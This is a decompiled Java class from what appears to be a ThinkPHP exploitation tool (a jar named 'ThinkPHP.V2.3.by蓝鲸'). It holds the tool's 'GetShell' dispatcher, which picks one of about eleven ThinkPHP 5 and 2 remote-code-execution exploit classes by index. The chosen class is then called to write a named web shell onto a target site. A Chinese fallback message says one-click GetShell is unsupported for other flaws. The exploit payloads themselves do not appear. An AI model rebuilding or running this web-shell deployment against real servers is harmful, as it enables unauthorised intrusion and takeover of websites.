/*    */ package dylan.services;public class GetShell { public static String getShell(String target, int index, String shellName, String shell) { tp5_invoke_func_code_exec_1 tp5ifce1; tp5_invoke_func_code_exec_2 tp5ifce2; tp5_construct_code_exec_1 tp5cce1; tp5_construct_code_exec_2 tp5cce2; tp5_construct_code_exec_3 tp5cce3;
/*    */     tp5_construct_code_exec_4 tp5cce4;
/*    */     tp5_construct_debug_rce tp5cdr;
/*    */     tp5_driver_display_rce tp5ddr;
/*    */     tp5_index_construct_rce tp5icr;
/*    */     tp5_templalte_driver_rce tptdr;
/*    */     tp2_lite_code_exec tp2lce;
/*  8 */     index = Util.vulTab.length - 1 - index;
/*  9 */     String results = null;
/* 10 */     switch (index)
/*    */     { case 20:
/* 12 */         tp5ifce1 = new tp5_invoke_func_code_exec_1();
/* 13 */         results = tp5ifce1.getShell(target, shell, shellName);
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */         
/* 98 */         return results;case 19: tp5ifce2 = new tp5_invoke_func_code_exec_2(); results = tp5ifce2.getShell(target, shell, shellName); return results;case 18: tp5cce1 = new tp5_construct_code_exec_1(); results = tp5cce1.getShell(target, shell, shellName); return results;case 17: tp5cce2 = new tp5_construct_code_exec_2(); results = tp5cce2.getShell(target, shell, shellName); return results;case 16: tp5cce3 = new tp5_construct_code_exec_3(); results = tp5cce3.getShell(target, shell, shellName); return results;case 15: tp5cce4 = new tp5_construct_code_exec_4(); results = tp5cce4.getShell(target, shell, shellName); return results;case 14: tp5cdr = new tp5_construct_debug_rce(); results = tp5cdr.getShell(target, shell, shellName); return results;case 13: tp5ddr = new tp5_driver_display_rce(); results = tp5ddr.getShell(target, shell, shellName); return results;case 12: tp5icr = new tp5_index_construct_rce(); results = tp5icr.getShell(target, shell, shellName); return results;case 7: tptdr = new tp5_templalte_driver_rce(); results = tptdr.getShell(target, shell, shellName); return results;case 6: tp2lce = new tp2_lite_code_exec(); results = tp2lce.getShell(target, shell, shellName); return results; }  results = "暂不支持此漏洞一键 GetShell ！\n"; return results; }
/*    */    }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\services\GetShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */